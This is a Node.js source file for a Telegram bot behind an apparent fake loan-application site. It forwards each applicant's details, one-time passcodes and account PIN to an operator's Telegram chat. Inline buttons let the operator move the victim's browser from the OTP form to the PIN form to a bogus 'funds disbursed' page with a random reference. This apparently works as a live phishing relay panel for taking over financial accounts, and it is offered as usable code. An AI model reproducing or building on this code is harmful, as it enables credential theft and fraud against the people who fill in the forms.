require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const router = express.Router();

// Initialize bot without polling (Render uses incoming webhook callbacks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

// Configure your Render URL webhook entry point dynamically
const RENDER_CALLBACK_URL = process.env.RENDER_URL 
    ? `${process.env.RENDER_URL}/bot/webhook` 
    : "https://your-app.onrender.com/bot/webhook";

// Automatically establish Webhook connections on startup when deployed on Render
bot.setWebHook(RENDER_CALLBACK_URL)
    .then(() => console.log(`Telegram Webhook successfully bound to endpoint: ${RENDER_CALLBACK_URL}`))
    .catch((err) => console.error(`Error setting up Webhook binding pipeline: ${err.message}`));

const botManager = {
    bot: bot,

    // Generic formatting utility for core info steps (Pass needsApproval = true for Step 3 and Step 4)
    sendToAdmin: (appId, title, data, stepContext = null) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        for (const [k, v] of Object.entries(data)) {
            if (v !== undefined && v !== '') {
                msg += `<b>${k}:</b> <code>${v}</code>\n`;
            }
        }
        msg += `━━━━━━━━━━━━━━━━━━━━`;

        const options = { parse_mode: 'HTML' };
        
        // Add tailored control dashboard buttons depending on current application pipeline status
        if (stepContext === "step3") {
            options.reply_markup = {
                inline_keyboard: [[
                    { text: "✅ APPROVE DATA -> GO OTP", callback_data: `approve_3_${appId}` },
                    { text: "❌ REJECT APPLICATION", callback_data: `reject_3_${appId}` }
                ]]
            };
        } else if (stepContext === "step4") {
            options.reply_markup = {
                inline_keyboard: [[
                    { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT OTP", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    // Specific formatting utility for Step 5 (PIN) with final disbursement controls
    sendFinalApproval: (appId, pin) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🏁 <b>FINAL ACCOUNT PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━`;
        
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "💰 CONFIRM PIN & DISBURSE", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT PIN CODE", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

/**
 * ------------------------------------------------------------------------
 * RENDER WEBHOOK CALLBACK CONTROLLER
 * ------------------------------------------------------------------------
 * Expose a clean Express Router endpoint to capture incoming POST events 
 * executed via interactive inline markup panel queries from system operators.
 */
router.post("/bot/webhook", (req, res) => {
    // Acknowledge receipt back up to Telegram right away to minimize latency loops
    res.sendStatus(200);

    const update = req.body;
    if (!update.callback_query) return;

    const query = update.callback_query;
    const [action, step, appId] = query.data.split("_");
    const io = global.io; // Pull Socket.io pool from international shared memory allocation context

    if (!io) {
        bot.answerCallbackQuery(query.id, { text: "Error: Socket server pool instance offline" });
        return;
    }

    const originalText = query.message.text || "";

    if (action === "approve") {
        if (step === "3") {
            // STEP 3 CONFIRM: Moves user frontend interface layout safely over into the Step 4 OTP form view
            io.to(appId).emit('admin-approve-otp'); 
            bot.answerCallbackQuery(query.id, { text: "Step 3 Cleared! Client moved to OTP validation." });
        }
        else if (step === "4") {
            // STEP 4 CONFIRM: Transitions active client frontend viewport into Step 5 Secure PIN layout
            io.to(appId).emit('otp-verified');
            bot.answerCallbackQuery(query.id, { text: "OTP Confirmed! Prompting user for transaction PIN." });
        } 
        else if (step === "5") {
            // STEP 5 CONFIRM: Resolves loan approval process, generates reference token string and pushes final screen
            const ref = "COD-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: `PIN Confirmed. Funds Disbursed via Ref: ${ref}` });
        }
        
        // Permanently preserve feedback visual confirmations in admin timeline history
        bot.editMessageText(`${originalText}\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        }).catch(err => console.error("Message modification lapse:", err.message));
    }

    if (action === "reject") {
        const rejectionNotice = { message: "Codsiga waa laga diaday nidaamka maamulka Telegram-ka" };

        if (step === "3") {
            io.to(appId).emit('admin-reject', rejectionNotice);
            bot.answerCallbackQuery(query.id, { text: "Application Rejected at Assessment Stage" });
        } else if (step === "4") {
            io.to(appId).emit('otp-failed', rejectionNotice);
            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
        } else if (step === "5") {
            io.to(appId).emit('pin-failed', rejectionNotice);
            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
        }

        // Permanently preserve decline trail visually inside operational logging timelines
        bot.editMessageText(`${originalText}\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        }).catch(err => console.error("Message modification lapse:", err.message));
    }
});

// Pack route references back out to mount smoothly inside core server engine setups
module.exports = {
    botManager,
    botRouter: router
};